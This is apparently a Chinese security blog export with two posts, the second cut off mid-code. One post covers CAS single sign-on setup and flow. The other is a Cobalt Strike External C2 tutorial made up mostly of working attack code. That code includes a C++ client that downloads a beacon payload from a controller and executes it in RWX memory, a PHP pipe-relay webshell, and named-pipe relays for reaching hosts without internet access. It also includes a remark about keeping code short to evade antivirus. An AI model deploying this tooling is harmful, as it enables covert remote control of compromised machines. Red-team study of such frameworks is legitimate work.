{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"cl0und/李三 Syclover核心成员 前奇安信高级攻防部（红队实习） 前拼多多安全工程师 HKUST短暂的RA Shopee安全工程师 currently pursuing a master degree in computer science at NUS","link":"/about/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"CAS的搭建及认证流程分析与比较","text":"CAS 简介CAS是一个单点登录（Single Sign On,简称SSO，SSO使得在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统）框架，开始是由耶鲁大学的一个组织开发，后来归到apereo去管。 CAS Server搭建在此下载：https://github.com/apereo/cas/tree/4.1.x通常来说用mvn编译cas-server-webapp后放到tomcat中就行，但是cas默认需要走https，否则在登陆流程和跳转webapp流程中会出现如下两种报错。 第一种解决办法是生成一个自签名的ssl证书并在tomcat的server.xml中配置。 1keytool -genkey -alias tomcat -keyalg RSA -keystore /path/to/my/keystore 1234&lt;Connector port=\"8443\" protocol=\"org.apache.coyote.http11.Http11NioProtocol\" maxThreads=\"150\" SSLEnabled=\"true\" scheme=\"https\" secure=\"true\" keystoreFile=\"${user.home}/.keystore\" keystorePass=\"p@assw0rd\" clientAuth=\"false\" sslProtocol=\"TLS\" /&gt; 但是这种方法影响wireshark后续抓包分析，并且默认情况下CAS要求webapp也是https。 第二种办法是修改cas配置使其允许http。有下面四步。 在p:httpClient-ref=&quot;supportsTrustStoreSslSocketFactoryHttpClient&quot;后增加p:requireSecure=&quot;false&quot; 修改WEB-INF/spring-configuration/ticketGrantingTicketCookieGenerator.xml 修改WEB-INF/spring-configuration/warnCookieGenerator.xml 修改注册服务WEB-INF/classes/services/HTTPSandIMAPS-10000001.json将&quot;serviceId&quot; : &quot;^(https|imaps)://.*&quot;修改为&quot;serviceId&quot; : &quot;^(https|http|imaps)://.*&quot; 修改重启后虽然前端还是会爆错，但是其实正常登陆了。默认的帐密是casuser/Mellon，记录在deployerConfigContext.xml中。 Webapp搭建在此下载：https://github.com/UniconLabs/cas-sample-java-webapp修改web.xml中casServerLoginUrl、casServerUrlPrefix、serverName值。casServerLoginUrl对应cas server地址（如果来客没有登陆过webapp就会把来客重定向到这里进行cas统一认证），casServerUrlPrefix对应cas server地址（这个值后续会跟一些api路径做拼接），serverName是webapp地址。 认证流程分析环境ip说明cas server：172.16.247.1cas webapp：172.16.247.139用户：172.16.247.131 user访问webapp，因为之前从未登陆过webapp，所以webapp会把user重定向给cas进行统一登陆（重定向的url的serivce中带有webapp自己的url好让cas知道user登陆成功后该重定向回哪里）。 user在cas登陆，登陆成功后cas会给user带一个cookie（TGC也叫TGT，如果之后要登陆其他webapp就不用重复输入密码而是直接给ST了）和一个ST（在location url中）的302回webapp。 webapp拿到user请求过来的ST会向CAS的api发送已验证ST的合法性，如果cas验证成功会发送给CAS的是成功的状态信息和用户的一些数据。 webapp从cas那里得知ST是有效的，给user设置cookie（用户之后就不必再走一次这个流程了）。并让用户成功登陆。 一图胜千言，图片来自网络（侵删）。 SSO vs Kerberos vs OAuth当时看完整个cas的认证流程感觉里面一些要素和kerberos和OAuth认证很相似（都有一个第三方来进行认证/授权）。因此相比较一下这三者的区别。 SSO vs Kerberossso和kerberos和共同点在他们都一个用TGT换ST的过程，不同点在于kerberos中其实有四个角色（client，KDC-AS，KDC-TS，server）并且因为“相近”的两个之间预先共享密钥，所以server不需要发送请求向KDC求证ST的真实性，但是CAS中server需要向cas server求证真实性。 SSO vs OAuth它俩之前最大的不同的在业务场景的不同，SSO用在一个公司内部员工的单点登陆。OAuth用在两个公司之前A公司获取其用户在B公司的一些数据。OAuth还常常涉及到啊AB两公司的帐号绑定，所以需要state来防止csrf，这个是SSO里面没有的。 杂编译整个cas的遇到org.samba.jcifs:jcifs-ext:0.9.4无法下载的问题，选择手动下载jar并安装到本地maven仓库中。 12#下载地址：http://maven.yonyoucloud.com/nexus/content/groups/public/org/samba/jcifs/jcifs-ext/0.9.4/mvn install:install-file -DgroupId=org.samba.jcifs -DartifactId=jcifs-ext -Dversion=0.9.4 -Dpackaging=jar -Dfile=/Users/cengsiqi/Downloads/jcifs-ext-0.9.4.jar 参考cas 4.1.4单点登录实战CAS 4.1.10关闭HTTPS使用maven命令安装jar包到本地maven仓库Spring P标签的使用","link":"/2020/01/31/CAS%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E6%AF%94%E8%BE%83/"},{"title":"CobaltStrike External C2信道","text":"简介CS的扩展C2接口（Cobalt Strike External Command and Control）可以允许第三方程序作为teamserver和Beacon之间的一个额外通信层。以下简称External C2。 架构External C2由一个第三方控制器和第三方客户端组成。架构示意图如下。 说白了就是一个代理转发的功能。 第三方控制器负责连接上CS的External C2服务、转发External C2服务提供的payload stage、转发攻击者下达的任务、Beeacon会话的相应等。 第三方服务端负责注入payload stage到内存、读取Beacon Session的相应，下达服务端传达的任务给Beacon session。 External C2协议数据帧External C2和SMB Beacon使用相同格式的数据帧（即External C2接收和发送的帧，SMB Beacon接受和发送的帧都是一样的）。所有帧都以4字节的小端字节顺序整数开始，此整数是帧内数据的长度。后面紧跟帧内数据。 未授权External C2不会对向它连接的第三方控制器进行鉴权，这听上很不合理，但事实它的本质就是一个listener。 External C2组件External C2 Server使用AS脚本进行启动，启动命令是 1externalc2_start(&quot;0.0.0.0&quot;, 2222); 第三方控制器当需要新会话时，第三方控制器连接到External C2。 与External C2的每个连接视作一个会话服务。 第三方控制器连接上External C2的第一个任务是发送需要的配置信息。它包括架构信息arch，命名管道pipename，回连间隔时间block。External C2不会ack这些消息，当配置完成后发送go指令，以告诉External C2发送payload stage 第三方控制器读取到payload stage并转发给第三方客户端，此时，第三方控制器必须等待从第三方客户端接收帧。 当此帧到来时，第三方控制器必须将帧写入到它对External C2 Server的连接（socket）。 第三方控制器现在必须从External C2 Server读取一个帧。 External C2 Server将等待配置的block时间再发送任务。 如果没有任何可用任务，External C2 Server将生成一个空任务的帧。 第三方控制器必须将其读取的帧发送给第三方客户端。 第三方控制器会一直重复等待-&gt;从一方读取-&gt;转发到另一方-&gt;等待的过程。 第三方客户端第三方客户端将接受第三方控制器第一步发来的payload stage。这个payload stage是一个因头部被patch可以自启动的DLL。正常的进程注入可以运行这段代码。 一旦payload stage跑起来了，第三方客户端可以连接便可以连接到命名管道服务器。第三方代理将像文件一样以读写方式打开命名管道。打开命名管道的路径是\\\\.\\pipe\\[pipe name here]。如果第三方客户端的语言有操作命名管道的API也可以使用。 第三方客户端现在必须从Beacon命名管道连接中读取一个帧。 读取此帧后，第三方客户端必须将此帧中继到第三方控制器进行处理。 第三方客户端现在必须等待来自第三方控制器的帧。 一旦此帧可用，第三方客户端必须将此帧写入命名管道连接。 第三方客户端也会一直重复等待-&gt;从一方读取-&gt;转发到另一方-&gt;等待的过程。 Demo代码控制端 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import socketimport structimport timeclass ExternalC2Controller: def __init__(self, port): self.port = port def encodeFrame(self, data): return struct.pack(\"&lt;I\", len(data)) + data def sendToTS(self, data): self._socketTS.sendall(self.encodeFrame(data)) def recvFromTS(self): data = \"\" _len = self._socketTS.recv(4) l = struct.unpack(\"&lt;I\",_len)[0] while len(data) &lt; l: data += self._socketTS.recv(l - len(data)) return data def sendToBeacon(self, data): self._socketClient.sendall(self.encodeFrame(data)) def recvFromBeacon(self): data = \"\" _len = self._socketClient.recv(4) l = struct.unpack(\"&lt;I\",_len)[0] while len(data) &lt; l: data += self._socketClient.recv(l - len(data)) return data def run(self): # First thing, wait for a connection from our custom beacon self._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) self._socketBeacon.bind((\"0.0.0.0\", 8081)) self._socketBeacon.listen(1) self._socketClient = self._socketBeacon.accept()[0] print \"Received C2 connection\" # Now we have a beacon connection, we kick off comms with CS External C2 self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) self._socketTS.connect((\"127.0.0.1\", self.port)) # Send out config options self.sendToTS(\"arch=x86\") self.sendToTS(\"pipename=xpntest\") self.sendToTS(\"block=500\") self.sendToTS(\"go\") # Receive the beacon payload from CS to forward to our custom beacon data = self.recvFromTS() while(True): print \"Sending %d bytes to beacon\" % len(data) self.sendToBeacon(data) data = self.recvFromBeacon() print \"Received %d bytes from beacon\" % len(data) print \"Sending %d bytes to TS\" % len(data) self.sendToTS(data) data = self.recvFromTS() print \"Received %d bytes from TS\" % len(data)controller = ExternalC2Controller(2222)controller.run() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.//#include \"pch.h\"#include &lt;WinSock2.h&gt;#include &lt;sys/stat.h&gt;#include &lt;ShellAPI.h&gt;#include &lt;Shlobj.h&gt;#pragma comment(lib,\"ws2_32.lib\")#pragma comment(lib,\"user32.lib\")#pragma comment(lib,\"Advapi32.lib\") #pragma comment(lib,\"Shell32.lib\")#pragma warning(disable:4996)// Allocates a RWX page for the CS beacon, copies the payload, and starts a new threadvoid spawnBeacon(char *payload, DWORD len) { HANDLE threadHandle; DWORD threadId = 0; char *alloc = (char *)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(alloc, payload, len); threadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &amp;threadId);}// Sends data to our C2 controller received from our injected beaconvoid sendData(SOCKET sd, const char *data, DWORD len) { char *buffer = (char *)malloc(len + 4); if (buffer == NULL) return; DWORD bytesWritten = 0, totalLen = 0; *(DWORD *)buffer = len; memcpy(buffer + 4, data, len); while (totalLen &lt; len + 4) { bytesWritten = send(sd, buffer + totalLen, len + 4 - totalLen, 0); totalLen += bytesWritten; } free(buffer);}// Receives data from our C2 controller to be relayed to the injected beaconchar *recvData(SOCKET sd, DWORD *len) { char *buffer; DWORD bytesReceived = 0, totalLen = 0; *len = 0; recv(sd, (char *)len, 4, 0); buffer = (char *)malloc(*len); if (buffer == NULL) return NULL; while (totalLen &lt; *len) { bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0); totalLen += bytesReceived; } return buffer;}// Creates a new C2 controller connection for relaying commandsSOCKET createC2Socket(const char *addr, WORD port) { WSADATA wsd; SOCKET sd; SOCKADDR_IN sin; WSAStartup(0x0202, &amp;wsd); memset(&amp;sin, 0, sizeof(sin)); sin.sin_family = AF_INET; sin.sin_port = htons(port); sin.sin_addr.S_un.S_addr = inet_addr(addr); sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); connect(sd, (SOCKADDR*)&amp;sin, sizeof(sin)); return sd;}// Connects to the name pipe spawned by the injected beaconHANDLE connectBeaconPipe(const char *pipeName) { HANDLE beaconPipe; beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL); return beaconPipe;}// Receives data from our injected beacon via a named pipechar *recvFromBeacon(HANDLE pipe, DWORD *len) { char *buffer; DWORD bytesRead = 0, totalLen = 0; *len = 0; ReadFile(pipe, len, 4, &amp;bytesRead, NULL); buffer = (char *)malloc(*len); while (totalLen &lt; *len) { ReadFile(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, NULL); totalLen += bytesRead; } return buffer;}// Write data to our injected beacon via a named pipevoid sendToBeacon(HANDLE pipe, const char *data, DWORD len) { DWORD bytesWritten = 0; WriteFile(pipe, &amp;len, 4, &amp;bytesWritten, NULL); WriteFile(pipe, data, len, &amp;bytesWritten, NULL);}int main(){ DWORD payloadLen = 0; char *payloadData = NULL; HANDLE beaconPipe = INVALID_HANDLE_VALUE; // Create a connection back to our C2 controller SOCKET c2socket = createC2Socket(\"172.16.247.10\", 8081); payloadData = recvData(c2socket, &amp;payloadLen); // Start the CS beacon spawnBeacon(payloadData, payloadLen); // Loop until the pipe is up and ready to use while (beaconPipe == INVALID_HANDLE_VALUE) { // Create our IPC pipe for talking to the C2 beacon Sleep(500); beaconPipe = connectBeaconPipe(\"\\\\\\\\.\\\\pipe\\\\xpntest\"); } while (true) { // Start the pipe dance payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen); if (payloadLen == 0) break; sendData(c2socket, payloadData, payloadLen); free(payloadData); payloadData = recvData(c2socket, &amp;payloadLen); if (payloadLen == 0) break; sendToBeacon(beaconPipe, payloadData, payloadLen); free(payloadData); } return 0;} 用External C2 解决不出网的问题这种情况使用client.php client.exe smb-beacon.exe作为一个通信链路。其运作方式是，client.exe打开管道smb-beacon.exe创建的beacon管道，读出数据写入client.exe创建的clientread管道，client.php打开clientread管道将数据传回第三方控制器。client.php将第三方控制器传入来的数据写入client.exe创建的clientwrite管道中，client.exe再读取clientwrite管道中的数据写入beacon管道。 client.exe在整个流程中扮演数据中继的角色，之所以需要client.exe做中继的本质原因是对于smb beacon来说每打开一次（fopen）相当于就是建立一个新的对话，而php没法对文件句柄持久化，如果用php直接操作beacon每次请求php都相当于一次另起炉灶，根本没有办法建立进行通信。所以client.exe对beacon句柄做持久化。 以下是demo代码，基本抄袭自hl0rey师傅的项目，代码中继管道的cpp代码只能在win10上跑，win7上跑不了，暂不清楚原因。 控制器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import socketimport structimport timeimport requestsclass ExternalC2Controller: def __init__(self, port): self.port = port def encodeFrame(self, data): return struct.pack(\"&lt;I\", len(data)) + data def sendToTS(self, data): print \"Send To Ts \" + self.encodeFrame(data) self._socketTS.sendall(self.encodeFrame(data)) def recvFromTS(self): data = \"\" _len = self._socketTS.recv(4) l = struct.unpack(\"&lt;I\",_len)[0] while len(data) &lt; l: data += self._socketTS.recv(l - len(data)) return data def sendToBeacon(self, data): params['action'] = \"write\" params['pipename'] = \"hlwrite\" params['data'] = self.encodeFrame(data) resp = requests.post(url=URL, data=params, timeout=30) print \"Write Content: \" + resp.text params['data'] = \"\" def recvFromBeacon(self): params['action'] = \"read\" params['pipename'] = \"hlread\" resp = requests.get(url=URL, params=params, timeout=30) print \"Read Content: \" + resp.text return resp.content def run(self): self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) self._socketTS.connect((\"127.0.0.1\", self.port)) self.sendToTS(\"arch=x64\") self.sendToTS(\"pipename=xpntest\") self.sendToTS(\"block=500\") self.sendToTS(\"go\") data = self.recvFromTS() while(True): data = self.recvFromBeacon() print \"Received %d bytes from beacon\" % len(data) print \"Sending %d bytes to TS\" % len(data) self.sendToTS(data) data = self.recvFromTS() print \"Received %d bytes from TS\" % len(data) print \"Sending %d bytes to beacon\" % len(data) self.sendToBeacon(data) time.sleep(3) #URL = \"http://172.16.247.145/pipe.php\"URL = \"http://172.16.247.145/index.php\"params = {\"pipename\":\"xpntest\", \"action\":\"\", \"data\":\"\"}controller = ExternalC2Controller(2222)controller.run() 123456789101112131415161718192021222324252627282930&lt;?php function recvFromBeacon($pipename){ $fp = fopen($pipename, \"rb\"); $len=fread($fp, 4); $len=unpack(\"v\", $len)[1]; $data=fread($fp, $len); fclose($fp); echo $data; } function sendToBeacon($pipename){ $fp = fopen($pipename, \"wb\"); $data=$_REQUEST[\"data\"]; fwrite($fp, $data); fclose($fp); echo $data; } if(isset($_REQUEST['action']) &amp;&amp; $_REQUEST['pipename']){ $pipename = '\\\\\\\\.\\\\pipe\\\\'.$_REQUEST['pipename']; if ($_REQUEST['action']=='read'){ recvFromBeacon($pipename); }elseif ($_REQUEST['action']=='write'){ sendToBeacon($pipename); } }else{ header('HTTP/1.1 404 Not Found'); exit('404'); } 中继代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#define PAYLOAD_MAX_SIZE 512 * 1024#define BUFFER_MAX_SIZE 1024 * 1024//桥，字面意思。方便把自定义的管道和beacon管道桥接的结构体struct BRIDGE{ HANDLE client; HANDLE server;};//从beacon读取数据DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) { DWORD size = 0, temp = 0, total = 0; /* read the 4-byte length */ ReadFile(my_handle, (char*)&amp; size, 4, &amp;temp, NULL); printf(&quot;read_frame length: %d\\n&quot;, size); /* read the whole thing in */ while (total &lt; size) { ReadFile(my_handle, buffer + total, size - total, &amp;temp, NULL); total += temp; } return size;}//向beacon写入数据void write_frame(HANDLE my_handle, char* buffer, DWORD length) { printf(&quot;write_frame length: %d\\n&quot;, length); DWORD wrote = 0; WriteFile(my_handle, (void*)&amp; length, 4, &amp;wrote, NULL); printf(&quot;write %d bytes.\\n&quot;, wrote); WriteFile(my_handle, buffer, length, &amp;wrote, NULL); printf(&quot;write %d bytes.\\n&quot;, wrote);}//从控制器读取数据DWORD read_client(HANDLE my_handle, char* buffer) { DWORD size = 0; DWORD readed = 0; ReadFile(my_handle, &amp;size, 4, NULL, NULL); printf(&quot;read_client length: %d\\n&quot;, size); ReadFile(my_handle, buffer, size, &amp;readed, NULL); printf(&quot;final data from client: %d\\n&quot;, readed); return readed;}//向控制器写入数据void write_client(HANDLE my_handle, char* buffer, DWORD length) { DWORD wrote = 0; WriteFile(my_handle, buffer, length, &amp;wrote, NULL); printf(&quot;write client total %d data %d\\n&quot;, wrote, length);}//客户端读管道、服务端写管道逻辑DWORD WINAPI ReadOnlyPipeProcess(LPVOID lpvParam) { //把两条管道的句柄取出来 struct BRIDGE* bridge = (struct BRIDGE*)lpvParam; HANDLE hpipe = bridge-&gt;client; HANDLE beacon = bridge-&gt;server; DWORD length = 0; char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE); if (buffer == NULL) { exit(-1); } //再次校验管道 if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE)) { return FALSE; } while (TRUE) { if (ConnectNamedPipe(hpipe, NULL)) { printf(&quot;client want read.\\n&quot;); length = read_frame(beacon, buffer, BUFFER_MAX_SIZE); printf(&quot;read from beacon: %d\\n&quot;, length); //分两次传送，发一次长度，再发数据。 write_client(hpipe,(char *) &amp;length, 4); FlushFileBuffers(hpipe); write_client(hpipe, buffer, length); FlushFileBuffers(hpipe); DisconnectNamedPipe(hpipe); //清空缓存区 ZeroMemory(buffer, BUFFER_MAX_SIZE); length = 0; } } return 1;}//客户端写管道、服务端读管道逻辑DWORD WINAPI WriteOnlyPipeProcess(LPVOID lpvParam) { //取出两条管道 struct BRIDGE* bridge = (struct BRIDGE*)lpvParam; HANDLE hpipe = bridge-&gt;client; HANDLE beacon = bridge-&gt;server; DWORD length = 0; char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE); if (buffer == NULL) { exit(-1); } if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE)) { return FALSE; } while (TRUE) { if (ConnectNamedPipe(hpipe, NULL)) { //一次性读，一次性写 printf(&quot;client want write.\\n&quot;); length = read_client(hpipe, buffer); printf(&quot;read from client: %d\\n&quot;, length); write_frame(beacon, buffer, length); DisconnectNamedPipe(hpipe); //清空缓存区 ZeroMemory(buffer, BUFFER_MAX_SIZE); length = 0; } } return 2;}int main(int argc, char* argv[]) { //创建客户端读管道 HANDLE hPipeRead = CreateNamedPipe(&quot;\\\\\\\\.\\\\pipe\\\\hlread&quot;, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL); //创建客户端写管道 HANDLE hPipeWrite = CreateNamedPipe(&quot;\\\\\\\\.\\\\pipe\\\\hlwrite&quot;, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL); //与beacon建立连接 HANDLE hfileServer = CreateFileA(&quot;\\\\\\\\.\\\\pipe\\\\hltest&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL); //检测管道和连接是否建立成功 if ((hPipeRead == INVALID_HANDLE_VALUE) || (hPipeWrite == INVALID_HANDLE_VALUE) || (hfileServer == INVALID_HANDLE_VALUE)) { if (hPipeRead == INVALID_HANDLE_VALUE) { printf(&quot;error during create readpipe.&quot;); } if (hPipeWrite == INVALID_HANDLE_VALUE) { printf(&quot;error during create writepipe.&quot;); } if (hfileServer == INVALID_HANDLE_VALUE) { printf(&quot;error during connect to beacon.&quot;); } exit(-1); } else { //一切正常 printf(&quot;all pipes are ok.\\n&quot;); } //放入客户端读管道和beacon连接 struct BRIDGE readbridge; readbridge.client = hPipeRead; readbridge.server = hfileServer; //启动客户端读管道逻辑 HANDLE hTPipeRead = CreateThread(NULL, 0, ReadOnlyPipeProcess, (LPVOID)&amp; readbridge, 0, NULL); //放入客户端写管道和beacon连接 struct BRIDGE writebridge; writebridge.client = hPipeWrite; writebridge.server = hfileServer; //启动客户端写管道逻辑 HANDLE hTPipeWrite = CreateThread(NULL, 0, WriteOnlyPipeProcess, (LPVOID)&amp; writebridge, 0, NULL); //代码没有什么意义，直接写个死循环也行 HANDLE waitHandles[] = { hPipeRead,hPipeWrite }; while (TRUE) { WaitForMultipleObjects(2, waitHandles, TRUE, INFINITE); } return 0;} 杂其它坑点php文件注意去BOM头%EF%BB%BF 读写管道的cpp代码cobaltstrike 自己生成smb beacon，剥离掉第三方注入shellcode的功能。这么做的原因是实际情况中代码越短越不好杀。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147// ConsoleApplication2.cpp : This file contains the 'main' function. Program execution begins and ends there.//#include \"pch.h\"#include &lt;iostream&gt;#include &lt;WinSock2.h&gt;#include &lt;sys/stat.h&gt;#include &lt;ShellAPI.h&gt;#include &lt;Shlobj.h&gt;#pragma comment(lib,\"ws2_32.lib\")#pragma comment(lib,\"user32.lib\")#pragma comment(lib,\"Advapi32.lib\") #pragma comment(lib,\"Shell32.lib\")#pragma warning(disable:4996)using std::cout;using std::endl;// Sends data to our C2 controller received from our injected beaconvoid sendData(SOCKET sd, const char *data, DWORD len) { cout &lt;&lt; \"Sends data to our C2 controller received from our injected beacon\" &lt;&lt; endl &lt;&lt; endl; char *buffer = (char *)malloc(len + 4); if (buffer == NULL) return; DWORD bytesWritten = 0, totalLen = 0; *(DWORD *)buffer = len; memcpy(buffer + 4, data, len); while (totalLen &lt; len + 4) { bytesWritten = send(sd, buffer + totalLen, len + 4 - totalLen, 0); totalLen += bytesWritten; } free(buffer);}// Receives data from our C2 controller to be relayed to the injected beaconchar *recvData(SOCKET sd, DWORD *len) { cout &lt;&lt; \"Receives data from our C2 controller to be relayed to the injected beacon\" &lt;&lt; endl &lt;&lt; endl; char *buffer; DWORD bytesReceived = 0, totalLen = 0; *len = 0; recv(sd, (char *)len, 4, 0); buffer = (char *)malloc(*len); if (buffer == NULL) return NULL; while (totalLen &lt; *len) { bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0); totalLen += bytesReceived; } return buffer;}// Creates a new C2 controller connection for relaying commandsSOCKET createC2Socket(const char *addr, WORD port) { cout &lt;&lt; \"Creates a new C2 controller connection for relaying commands\" &lt;&lt; endl &lt;&lt; endl; WSADATA wsd; SOCKET sd; SOCKADDR_IN sin; WSAStartup(0x0202, &amp;wsd); memset(&amp;sin, 0, sizeof(sin)); sin.sin_family = AF_INET; sin.sin_port = htons(port); sin.sin_addr.S_un.S_addr = inet_addr(addr); sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); connect(sd, (SOCKADDR*)&amp;sin, sizeof(sin)); return sd;}// Connects to the name pipe spawned by the injected beaconHANDLE connectBeaconPipe(const char *pipeName) { cout &lt;&lt; \"Connects to the name pipe spawned by the injected beacon\" &lt;&lt; endl &lt;&lt; endl; HANDLE beaconPipe; beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL); return beaconPipe;}// Receives data from our injected beacon via a named pipechar *recvFromBeacon(HANDLE pipe, DWORD *len) { cout &lt;&lt; \"Receives data from our injected beacon via a named pipe\" &lt;&lt; endl &lt;&lt; endl; char *buffer; DWORD bytesRead = 0, totalLen = 0; *len = 0; ReadFile(pipe, len, 4, &amp;bytesRead, NULL); buffer = (char *)malloc(*len); while (totalLen &lt; *len) { ReadFile(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, NULL); totalLen += bytesRead; } return buffer;}// Write data to our injected beacon via a named pipevoid sendToBeacon(HANDLE pipe, const char *data, DWORD len) { cout &lt;&lt; \"Write data to our injected beacon via a named pipe\" &lt;&lt; endl &lt;&lt; endl; DWORD bytesWritten = 0; WriteFile(pipe, &amp;len, 4, &amp;bytesWritten, NULL); WriteFile(pipe, data, len, &amp;bytesWritten, NULL);}int main(){ DWORD payloadLen = 0; char *payloadData = NULL; HANDLE beaconPipe = INVALID_HANDLE_VALUE; // Create a connection back to our C2 controller SOCKET c2socket = createC2Socket(\"172.16.247.10\", 8081); // Loop until the pipe is up and ready to use while (beaconPipe == INVALID_HANDLE_VALUE) { cout &lt;&lt; \"Create our IPC pipe for talking to the C2 beacon\" &lt;&lt; endl &lt;&lt; endl; // Create our IPC pipe for talking to the C2 beacon Sleep(500); beaconPipe = connectBeaconPipe(\"\\\\\\\\.\\\\pipe\\\\xpntest\"); } while (true) { // Start the pipe dance payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen); if (payloadLen == 0) break; sendData(c2socket, payloadData, payloadLen); free(payloadData); payloadData = recvData(c2socket, &amp;payloadLen); if (payloadLen == 0) break; sendToBeacon(beaconPipe, payloadData, payloadLen); free(payloadData); } return 0;} 管道通信只能点对点 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127using System;using System.IO;using System.IO.Pipes;using System.Threading;namespace ConsoleApp1{ class Program { static void Main(string[] args) { //connect to beacon NamedPipeClientStream pipeClient = new NamedPipeClientStream(&quot;\\\\\\\\.\\\\&quot;, &quot;xpntest&quot;, PipeDirection.InOut); Console.WriteLine(&quot;[client] Attemping to connect to pipe...&quot;); pipeClient.Connect(); Console.WriteLine(&quot;[client] connected to pipe&quot;); Console.WriteLine(&quot;[client] There are currently {0} pipe server instances open.&quot;, pipeClient.NumberOfServerInstances); StreamWriter writer = new StreamWriter(pipeClient); StreamReader reader = new StreamReader(pipeClient); writer.AutoFlush = true; //create pipe to write NamedPipeServerStream pipeWriteServer1 = new NamedPipeServerStream(&quot;hlwrite&quot;, PipeDirection.InOut); NamedPipeClientStream pipeWriteClient1 = new NamedPipeClientStream(&quot;\\\\\\\\.\\\\&quot;, &quot;hlwrite&quot;, PipeDirection.InOut); pipeWriteClient1.Connect(); StreamWriter pipeWriteClientWriter = new StreamWriter(pipeWriteClient1); pipeWriteClientWriter.AutoFlush = true; //create pipe to read NamedPipeServerStream pipeReadServer2 = new NamedPipeServerStream(&quot;hlread&quot;, PipeDirection.InOut); NamedPipeClientStream pipeReadClient2 = new NamedPipeClientStream(&quot;\\\\\\\\.\\\\&quot;, &quot;hlread&quot;, PipeDirection.InOut); pipeReadClient2.Connect(); StreamReader pipeReadClientReader = new StreamReader(pipeReadClient2); Console.WriteLine(&quot;All pipes are ok.&quot;); Thread readOnlyThread = new Thread(() =&gt; ReadOnlyPipeProcess(reader, pipeWriteClientWriter)); readOnlyThread.IsBackground = true; readOnlyThread.Start(); Thread WriteOnlyThread = new Thread(() =&gt; WriteOnlyPipeProcess(pipeReadClientReader, writer)); WriteOnlyThread.IsBackground = true; WriteOnlyThread.Start(); readOnlyThread.Join(); } public static uint read_frame(StreamReader reader, string buffer) { //First, read size. uint frame_size = 0; int i = 0; byte[] size = new byte[4]; for (i = 0; i &lt; 4; i++) { size[i] = (Byte)reader.Read(); } //Array.Reverse(size); frame_size = BitConverter.ToUInt32(size, 0); Console.WriteLine(&quot;read_frame length: {0}.&quot;, frame_size); //Second, read data byte[] data = new byte[frame_size]; for (i = 0; i &lt; frame_size; i++) { data[i] = (Byte)reader.Read(); } buffer = System.Text.Encoding.ASCII.GetString(data); Console.WriteLine(&quot;The frame data is: {0}&quot;, buffer); return frame_size; } public static void write_frame(StreamWriter writer, string buffer) { //Get buffer size int frame_size = buffer.Length; int i; Console.WriteLine(&quot;write_frame length: {0}.&quot;, frame_size); byte[] size = BitConverter.GetBytes(frame_size); //Array.Reverse(size); //First, write size for (i = 0; i &lt; size.Length; i++) { writer.Write(size[0]); } //Second, write data for (i = 0; i &lt; frame_size; i++) { writer.Write(buffer[i]); } } //read data from beacon and write into own pipe public static void ReadOnlyPipeProcess(StreamReader reader, StreamWriter writer) { string buffer = &quot;&quot;; while (true) { Console.WriteLine(&quot;Client want read.&quot;); uint length = read_frame(reader, 